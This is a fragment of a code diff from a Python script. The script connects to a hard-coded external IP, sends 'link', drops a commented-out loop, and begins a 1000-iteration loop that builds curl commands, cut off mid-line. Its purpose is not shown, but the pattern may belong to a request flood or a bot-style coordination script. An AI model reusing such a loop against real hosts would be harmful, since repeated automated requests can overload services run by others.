@@ -50,13 +50,6 @@ if arg == "N":
     client_socket_2.connect(('43.132.214.22', 2000))
     message = "link"
     client_socket_2.sendall(message.encode())
-    # while True:
-    #     try:
-    #         response = client_socket_2.sendall(message.encode())
-    #         if response == b'':
-    #             break
-    #     except socket.error as e:
-    #         break
 
     for i in range(1000):
         curl_command = f"""
